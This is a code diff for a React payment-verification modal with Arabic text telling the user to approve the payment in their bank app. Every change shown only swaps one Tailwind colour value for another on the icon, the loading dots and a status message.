@@ -77,8 +77,8 @@ export function CarrierVerificationModal({
             <div className="relative mx-auto flex h-24 w-24 items-center justify-center">
               <div className="absolute h-24 w-24 animate-ping rounded-full border-4 border-yellow-400/30" />
               <div className="absolute h-20 w-20 rounded-full border-4 border-yellow-400/50" />
-              <div className="flex h-14 w-14 items-center justify-center rounded-full bg-[#0a4a68]/10">
-                <Smartphone className="h-8 w-8 text-[#0a4a68]" />
+              <div className="flex h-14 w-14 items-center justify-center rounded-full bg-[#1976d2]/10">
+                <Smartphone className="h-8 w-8 text-[#1976d2]" />
               </div>
             </div>
             <div className="space-y-3 text-center">
@@ -86,19 +86,19 @@ export function CarrierVerificationModal({
                 تم إرسال رمز التحقق. يرجى الدخول إلى تطبيق البنك الخاص بك والموافقة على العملية لإتمام الدفع.
               </p>
               <div className="flex items-center justify-center gap-2">
-                <span className="h-2.5 w-2.5 animate-bounce rounded-full bg-[#0a4a68]" style={{ animationDelay: "0ms" }} />
-                <span className="h-2.5 w-2.5 animate-bounce rounded-full bg-[#0a4a68]" style={{ animationDelay: "150ms" }} />
-                <span className="h-2.5 w-2.5 animate-bounce rounded-full bg-[#0a4a68]" style={{ animationDelay: "300ms" }} />
+                <span className="h-2.5 w-2.5 animate-bounce rounded-full bg-[#1976d2]" style={{ animationDelay: "0ms" }} />
+                <span className="h-2.5 w-2.5 animate-bounce rounded-full bg-[#1976d2]" style={{ animationDelay: "150ms" }} />
+                <span className="h-2.5 w-2.5 animate-bounce rounded-full bg-[#1976d2]" style={{ animationDelay: "300ms" }} />
               </div>
             </div>
             {isConfirming ? (
               <div className="flex flex-col items-center gap-3">
                 <div className="flex items-center justify-center gap-2">
-                  <span className="h-3 w-3 animate-bounce rounded-full bg-[#0a4a68]" style={{ animationDelay: "0ms" }} />
-                  <span className="h-3 w-3 animate-bounce rounded-full bg-[#0a4a68]" style={{ animationDelay: "150ms" }} />
-                  <span className="h-3 w-3 animate-bounce rounded-full bg-[#0a4a68]" style={{ animationDelay: "300ms" }} />
+                  <span className="h-3 w-3 animate-bounce rounded-full bg-[#1976d2]" style={{ animationDelay: "0ms" }} />
+                  <span className="h-3 w-3 animate-bounce rounded-full bg-[#1976d2]" style={{ animationDelay: "150ms" }} />
+                  <span className="h-3 w-3 animate-bounce rounded-full bg-[#1976d2]" style={{ animationDelay: "300ms" }} />
                 </div>
-                <p className="text-sm font-semibold text-[#0a4a68]">جاري انتظار موافقة البنك...</p>
+                <p className="text-sm font-semibold text-[#1976d2]">جاري انتظار موافقة البنك...</p>
               </div>
             ) : (
               <button
